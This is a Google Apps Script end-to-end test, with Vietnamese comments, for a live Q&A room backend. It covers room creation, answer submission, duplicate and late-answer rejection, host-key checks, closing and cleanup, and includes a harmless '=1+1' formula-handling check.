/** Chạy thử trong editor: tạo phòng, gửi 2 câu, gửi trùng, đổi câu, gửi câu cũ, đóng, xóa. Cuối cùng "test_: XONG". */
function test_() {
  var key = PropertiesService.getScriptProperties().getProperty(HOST_KEY_PROP);
  if (!key) { Logger.log('test_: chưa có khóa người dẫn. Chạy makeHostKey trước.'); return; }
  function post(o) { return JSON.parse(doPost({ postData: { contents: JSON.stringify(o) } }).getContent()); }
  function get(p) { return JSON.parse(doGet({ parameter: p }).getContent()); }
  function step(name, r, okWhen) {
    var ok = okWhen(r);
    Logger.log('test_: ' + (ok ? 'OK   ' : 'LỖI  ') + name + ' → ' + JSON.stringify(r).slice(0, 160));
    if (!ok) throw new Error('test_ thất bại ở bước: ' + name);
  }
  ensureSheets_();
  var created = post({ action: 'createRoom', key: key, questions: ['Câu thử 1', 'Câu thử 2'] });
  step('createRoom', created, function (r) { return r.result === 'success' && r.room.questionCount === 2; });
  var code = created.room.code;
  try {
    step('ping', get({ action: 'ping' }), function (r) { return r.pong === true; });
    step('heartbeat máy 1', get({ action: 'heartbeat', room: code, device: 'testdevice0001' }), function (r) { return r.result === 'success' && r.currentQuestion.index === 1; });
    step('gửi máy 1', post({ action: 'submitAnswer', room: code, device: 'testdevice0001', q: 1, text: 'trắng xanh' }), function (r) { return r.result === 'success'; });
    step('gửi máy 2', post({ action: 'submitAnswer', room: code, device: 'testdevice0002', q: 1, text: '=1+1 (thử formula)' }), function (r) { return r.result === 'success'; });
    step('gửi trùng máy 1', post({ action: 'submitAnswer', room: code, device: 'testdevice0001', q: 1, text: 'lại' }), function (r) { return r.error === 'already_answered'; });
    step('getState', post({ action: 'getState', key: key, room: code, since: 0 }), function (r) { return r.result === 'success' && r.cursor === 2 && r.counts.participants === 1; });
    step('setQuestion 2', post({ action: 'setQuestion', key: key, room: code, index: 2 }), function (r) { return r.result === 'success' && r.room.currentIndex === 2; });
    step('gửi câu cũ', post({ action: 'submitAnswer', room: code, device: 'testdevice0003', q: 1, text: 'muộn' }), function (r) { return r.error === 'question_changed' && r.currentIndex === 2; });
    step('sai khóa', post({ action: 'closeRoom', key: 'sai-khoa', room: code }), function (r) { return r.error === 'host_key_invalid'; });
    step('closeRoom', post({ action: 'closeRoom', key: key, room: code }), function (r) { return r.result === 'success' && r.room.status === 'closed' && r.counts.answersTotal === 2; });
    step('gửi sau khi đóng', post({ action: 'submitAnswer', room: code, device: 'testdevice0004', q: 2, text: 'x' }), function (r) { return r.error === 'room_closed'; });
    step('GET không action', get({}), function (r) { return r.error === 'public_read_disabled'; });
  } finally {
    var del = post({ action: 'deleteRoom', key: key, room: code });
    Logger.log('test_: deleteRoom → ' + JSON.stringify(del));
  }
  Logger.log('test_: XONG');
}
